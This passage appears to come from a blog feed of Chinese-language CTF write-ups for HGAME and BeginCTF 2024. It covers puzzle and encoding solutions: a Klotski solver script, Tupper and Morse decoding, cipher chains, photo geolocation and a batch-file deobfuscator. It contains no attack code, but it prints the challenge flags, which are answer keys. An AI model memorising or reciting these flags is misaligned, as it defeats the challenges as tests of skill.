src="/2024-HGAME-MISC-WP/1707313374782-47f3362a-4903-488e-8e8c-7be6f30b7b83.png" alt="qrcode.png"><br>修改掩码<br><img src="/2024-HGAME-MISC-WP/1707313444189-93f51ec0-3ff0-4ca9-aa97-b78ab199879b.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;drag0n_1s_d4nc1ng&#125;</span><br></pre></td></tr></table></figure><h2 id="我要成为华容道高手"><a href="#我要成为华容道高手" class="headerlink" title="我要成为华容道高手"></a>我要成为华容道高手</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 找到原版链接：https://github.com/conwnet/huarongdao/blob/master/src/core.js</span></span><br><span class="line"><span class="comment">// 原版代码中有 getSlove 函数</span></span><br><span class="line"><span class="comment">// 但是需要修改如下：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> getSolve = <span class="keyword">function</span> (<span class="params">state</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> que = [state], vst = &#123;[state]: &#123;<span class="attr">prev</span>: <span class="literal">null</span>, <span class="attr">move</span>: <span class="literal">null</span>&#125;&#125;, result = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(que.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> cur = que.<span class="title function_">shift</span>(), res = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cur[<span class="number">13</span>] === <span class="string">&#x27;5&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 当找到目标状态时，反向追踪回初始状态</span></span><br><span class="line">            <span class="keyword">let</span> traceState = cur;</span><br><span class="line">            <span class="keyword">while</span>(vst[traceState].<span class="property">prev</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">let</span> moveInfo = vst[traceState].<span class="property">move</span>; <span class="comment">// 获取移动信息，包括位置和方向</span></span><br><span class="line">                result.<span class="title function_">unshift</span>(moveInfo); <span class="comment">// 将移动信息添加到结果数组的开头</span></span><br><span class="line">                traceState = vst[traceState].<span class="property">prev</span>; <span class="comment">// 追踪到前一个状态</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; cur.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            (res = <span class="title function_">moveUp</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = &#123;<span class="attr">prev</span>: cur, <span class="attr">move</span>: &#123;<span class="attr">position</span>: i, <span class="attr">direction</span>: <span class="number">1</span>&#125;&#125;);</span><br><span class="line">            (res = <span class="title function_">moveDown</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = &#123;<span class="attr">prev</span>: cur, <span class="attr">move</span>: &#123;<span class="attr">position</span>: i, <span class="attr">direction</span>: <span class="number">3</span>&#125;&#125;);</span><br><span class="line">            (res = <span class="title function_">moveLeft</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = &#123;<span class="attr">prev</span>: cur, <span class="attr">move</span>: &#123;<span class="attr">position</span>: i, <span class="attr">direction</span>: <span class="number">4</span>&#125;&#125;);</span><br><span class="line">            (res = <span class="title function_">moveRight</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = &#123;<span class="attr">prev</span>: cur, <span class="attr">move</span>: &#123;<span class="attr">position</span>: i, <span class="attr">direction</span>: <span class="number">2</span>&#125;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注释export</span></span><br><span class="line"><span class="comment">//export default &#123; </span></span><br><span class="line"><span class="comment">//    moveUp, moveDown, moveLeft, moveRight, getSolve</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://106.14.57.14:31169&#x27;</span></span><br><span class="line"></span><br><span class="line">js_code = <span class="built_in">open</span>(<span class="string">&quot;core.js&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).read()</span><br><span class="line">ctx = execjs.<span class="built_in">compile</span>(js_code)</span><br><span class="line">state = <span class="string">&#x27;05132111241230411412&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSolve</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> ctx.call(<span class="string">&quot;getSolve&quot;</span>, state)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.get(url + <span class="string">&#x27;/api/newgame&#x27;</span>).json()</span><br><span class="line">gameId = <span class="built_in">str</span>(response[<span class="string">&#x27;gameId&#x27;</span>])</span><br><span class="line">result = getSolve(response[<span class="string">&#x27;layout&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url + <span class="string">&#x27;/api/submit/&#x27;</span> + gameId, json=result).json()</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        layout = <span class="built_in">str</span>(response[<span class="string">&#x27;game_stage&#x27;</span>][<span class="string">&#x27;layout&#x27;</span>])</span><br><span class="line">        result = getSolve(layout)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(response[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 BeginCTF MISC WP</title>
      <link href="/2024-BeginCTF-MISC-WP/"/>
      <url>/2024-BeginCTF-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><hr><h2 id="Tupper"><a href="#Tupper" class="headerlink" title="Tupper"></a>Tupper</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path = <span class="string">r&#x27;tupper&#x27;</span></span><br><span class="line">dirlist = os.listdir(path)</span><br><span class="line">filelist = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> dirlist:</span><br><span class="line">    tmp = path + <span class="string">f&#x27;\&#123;file&#125;&#x27;</span></span><br><span class="line">    filelist[<span class="built_in">int</span>(file.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])] = tmp</span><br><span class="line"></span><br><span class="line">base = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">sorted</span>(filelist.keys()):</span><br><span class="line">    base += <span class="built_in">open</span>(filelist[num]).read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(base).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184</span></span><br></pre></td></tr></table></figure><p>Tupper绘图<br><img src="/2024-BeginCTF-MISC-WP/1706726511191-e8821f82-b373-4ed3-9fa5-b7c30aa7f89c.png" alt="image.png"></p><h2 id="devil’s-word"><a href="#devil’s-word" class="headerlink" title="devil’s word"></a>devil’s word</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">strings = <span class="built_in">open</span>(<span class="string">r&quot;devil&#x27;s word\devil&#x27;s word.txt&quot;</span>).read().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;leng&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lia&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sa&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sii&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ng&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;leu&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cai&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bo&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jau&#x27;</span>: <span class="string">&#x27;9&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> strings:</span><br><span class="line">    data += <span class="built_in">dict</span>[word] <span class="keyword">if</span> (word <span class="keyword">in</span> <span class="built_in">dict</span>) <span class="keyword">else</span> word</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(data).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># begin&#123;y0u_kn0w_w3nzhou_di4lect&#125;</span></span><br></pre></td></tr></table></figure><h2 id="下一站上岸"><a href="#下一站上岸" class="headerlink" title="下一站上岸"></a>下一站上岸</h2><p><img src="/2024-BeginCTF-MISC-WP/1706727262055-325aef7c-e141-4bd0-a47c-38bd74f633b7.png" alt="35D7551B981E7397CBDAFEEEF57F2696.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 一个交点 = &#x27;.&#x27;</span><br><span class="line"># 两个交点 = &#x27;-&#x27;</span><br><span class="line"># 无交点 = &#x27; &#x27;</span><br><span class="line"></span><br><span class="line"># --. --- ..--.- .- ... .... --- .-. . &gt; go_ashore</span><br><span class="line"></span><br><span class="line"># begin&#123;go_ashore&#125;</span><br></pre></td></tr></table></figure><h2 id="你知道中国文化嘛1-0"><a href="#你知道中国文化嘛1-0" class="headerlink" title="你知道中国文化嘛1.0"></a>你知道中国文化嘛1.0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 替换字符</span><br><span class="line"># 得到替换字符的具体思路是将社会主义核心价值观进行八卦加密，然后进行base32，再与原文对比得到替换字符</span><br><span class="line">&#x27;$&#x27;: &#x27;S&#x27;,</span><br><span class="line">&#x27;&amp;&#x27;: &#x27;7&#x27;,</span><br><span class="line">&#x27;@&#x27;: &#x27;2&#x27;</span><br><span class="line"></span><br><span class="line"># base32解码</span><br><span class="line">4KMLHYUYWTRJRNP...FGFQ4KMLFYUYWDRJRN &gt; ☳☴☵☲...☵☲☱☱</span><br><span class="line"></span><br><span class="line"># 八卦解码（随波逐流）</span><br><span class="line">☳☴☵☲...☵☲☱☱ &gt; 公正文明公正和谐公正平等文明友善法治和谐法治公正文明公正平等公正平等和谐爱国公正平等和谐和谐公正自由和谐爱国和谐富强和谐爱国公正公正公正和谐公正法治公正平等公正自由文明诚信和谐和谐文明公正平等公正公正和谐敬业和谐自由公正公正法治友善法治公正敬业法治友善平等公正民主和谐法治文明诚信和谐和谐民主和谐爱国文明诚信和谐和谐民主和谐文明公正友善爱国和谐爱国和谐民主公正和谐公正平等</span><br><span class="line"></span><br><span class="line"># 社会主义核心价值观解码</span><br><span class="line">公正文明公正和谐公正平等文明友善法治和谐法治公正文明公正平等公正平等和谐爱国公正平等和谐和谐公正自由和谐爱国和谐富强和谐爱国公正公正公正和谐公正法治公正平等公正自由文明诚信和谐和谐文明公正平等公正公正和谐敬业和谐自由公正公正法治友善法治公正敬业法治友善平等公正民主和谐法治文明诚信和谐和谐民主和谐爱国文明诚信和谐和谐民主和谐文明公正友善爱国和谐爱国和谐民主公正和谐公正平等 &gt; bce-7bee8e3d808fcged-2ef94f&#125;i&#123;a7-18-12n81ce</span><br><span class="line"></span><br><span class="line"># 栅栏密码</span><br><span class="line">bce-7bee8e3d808fcged-2ef94f&#125;i&#123;a7-18-12n81ce &gt; begin&#123;eec8da87-ee32-11ed-8f8c-907841e2ffbc&#125;</span><br><span class="line"></span><br><span class="line"># begin&#123;eec8da87-ee32-11ed-8f8c-907841e2ffbc&#125;</span><br></pre></td></tr></table></figure><h2 id="where-is-crazyman1-0"><a href="#where-is-crazyman1-0" class="headerlink" title="where is crazyman1.0"></a>where is crazyman1.0</h2><p><img src="/2024-BeginCTF-MISC-WP/1707051680428-24792a37-1696-40ce-a076-c62348d44144.png" alt="pic.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">看着就像秋叶原</span><br><span class="line">begin&#123;秋叶原&#125;</span><br></pre></td></tr></table></figure><h2 id="where-is-crazyman2-0"><a href="#where-is-crazyman2-0" class="headerlink" title="where is crazyman2.0"></a>where is crazyman2.0</h2><p><img src="/2024-BeginCTF-MISC-WP/1707051709347-9bb7967f-95ee-4f35-9c38-fa2b33d8e66d.png" alt="pic2.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/35229002/1707051768231-31af04b2-eb7c-4ec2-8ba9-36cab0a92ec1.png" alt="pic3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># https://arabsstock.com/en/videos/clip-162878-spending-enjoyable-time-getting-know-civilizations-entertainment</span><br><span class="line"></span><br><span class="line">begin&#123;Boulevard World&#125;</span><br></pre></td></tr></table></figure><h2 id="where-is-crazyman3-0"><a href="#where-is-crazyman3-0" class="headerlink" title="where is crazyman3.0"></a>where is crazyman3.0</h2><p><img src="/2024-BeginCTF-MISC-WP/1707052032170-15d711a9-5cf6-40cc-9d20-57f15ce95d18.png" alt="pic3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># google关键词 &quot;BOUDL&quot; &quot;STARBUCKS&quot; &quot;5 min walk&quot;</span><br><span class="line"># Boudl Al Munsiyah Hotel</span><br><span class="line"># Starbucks </span><br><span class="line"># 最新评论 YmVnaW57R29vZ2xlX21hcF9pc191c2VmdWxfYW5kX25vdF9mb3JnZXRfY29tbWVudH0=</span><br><span class="line"></span><br><span class="line">begin&#123;Google_map_is_useful_and_not_forget_comment&#125;</span><br></pre></td></tr></table></figure><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="beginner-Forensics"><a href="#beginner-Forensics" class="headerlink" title="beginner_Forensics!!!!"></a>beginner_Forensics!!!!</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Batch Decryption 202009 (BatchEncryption Build 201610)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (data[<span class="number">0</span>] == <span class="number">0xFF</span> <span class="keyword">and</span> data[<span class="number">1</span>] == <span class="number">0xFE</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Batch decryption bom error!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(data[<span class="number">2</span>:<span class="number">9</span>], encoding=<span class="string">&quot;utf-8&quot;</span>) != <span class="string">&#x27; &amp;cls\r\n&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Batch decryption cls error!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(data[<span class="number">9</span>:<span class="number">60</span>], encoding=<span class="string">&quot;utf-8&quot;</span>) != <span class="string">&#x27;::BatchEncryption Build 201610 By gwsbhqt@163.com\r\n&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Batch decryption build error!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">vars</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># decryption line</span></span><br><span class="line">    i = <span class="number">60</span></span><br><span class="line">    l = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">while</span> i &lt; l:</span><br><span class="line">        i = run(<span class="built_in">vars</span>, data, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params"><span class="built_in">vars</span>, data, i</span>):</span><br><span class="line">    buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    x = <span class="literal">False</span></span><br><span class="line">    l = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">if</span> data[i] == <span class="number">0x0d</span> <span class="keyword">and</span> data[i+<span class="number">1</span>] == <span class="number">0x0a</span>:</span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># get %var:~x,y% %0</span></span><br><span class="line">        <span class="keyword">if</span> data[i] == <span class="number">0x25</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x:</span><br><span class="line">                x = <span class="literal">True</span></span><br><span class="line">                f = i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = <span class="literal">False</span></span><br><span class="line">                t = i</span><br><span class="line">                rst = var_percent(data[f:t+<span class="number">1</span>], <span class="built_in">vars</span>)</span><br><span class="line">                buf += rst</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x:</span><br><span class="line">                buf += <span class="built_in">str</span>(data[i:i+<span class="number">1</span>], encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (f + <span class="number">1</span> == i) <span class="keyword">and</span> ((data[i] &gt;= <span class="number">0x30</span> <span class="keyword">and</span> data[i] &lt;= <span class="number">0x39</span>) <span class="keyword">or</span> data[i] == <span class="number">0x2a</span>):</span><br><span class="line">                    x = <span class="literal">False</span></span><br><span class="line">                    t = i</span><br><span class="line">                    rst = <span class="built_in">str</span>(data[f:t+<span class="number">1</span>], encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                    buf += rst</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= l:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="built_in">print</span>(buf)</span><br><span class="line">    bufs = buf.split(<span class="string">&#x27;&amp;@&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> var <span class="keyword">in</span> bufs:</span><br><span class="line">        <span class="keyword">if</span> var[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">&#x27;set &#x27;</span>:</span><br><span class="line">            var = var[<span class="number">4</span>:]</span><br><span class="line">            b = var.find(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="built_in">vars</span>[var[<span class="number">0</span>:b]] = var[b+<span class="number">1</span>:].replace(<span class="string">&#x27;^^^&#x27;</span>, <span class="string">&#x27;^&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">var_percent</span>(<span class="params">data, <span class="built_in">vars</span></span>):</span><br><span class="line">    full = <span class="built_in">str</span>(data, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    buf = full[<span class="number">1</span>:<span class="built_in">len</span>(full)-<span class="number">1</span>]</span><br><span class="line">    buf = buf.split(<span class="string">&#x27;:~&#x27;</span>)</span><br><span class="line">    var = buf[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> var <span class="keyword">in</span> <span class="built_in">vars</span>:</span><br><span class="line">        <span class="built_in">vars</span>[var] = os.getenv(var)</span><br><span class="line">    ent = <span class="built_in">vars</span>[var]</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(buf) &gt; <span class="number">1</span>):</span><br><span class="line">        l = <span class="built_in">len</span>(ent)</span><br><span class="line">        buf = buf[<span class="number">1</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        f = <span class="built_in">int</span>(buf[<span class="number">0</span>])</span><br><span class="line">        t = <span class="built_in">int</span>(buf[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> f &lt; <span class="number">0</span>:</span><br><span class="line">            f, t = l + f, t</span><br><span class="line">        rst = ent[f: f+t]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rst = full</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encrypt_file = <span class="string">r&quot;C:\Users\HK\Desktop\BeginCTF\beginner_Forensics!!!\forensics&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file = <span class="built_in">open</span>(encrypt_file, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        data = file.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Batch decryption read error:&#x27;</span>, err)</span><br><span class="line">        exit</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file.close()</span><br><span class="line"></span><br><span class="line">    decryption(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set find_me_pls = b@TcH_O8FU$c@T1on_15_e@SY_70_SO1vE</span></span><br><span class="line"><span class="comment"># begin&#123;b@TcH_O8FU$c@T1on_15_e@SY_70_SO1vE&#125;</span></span><br></pre></td></tr></table></figure><h2 id="dump-dump-dump"><a href="#dump-dump-dump" class="headerlink" title="dump dump dump"></a>dump dump dump</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># strings dumpv1.DMP | grep &#x27;a = &#x27;</span><br><span class="line">&gt;</span><br><span class="line">a = 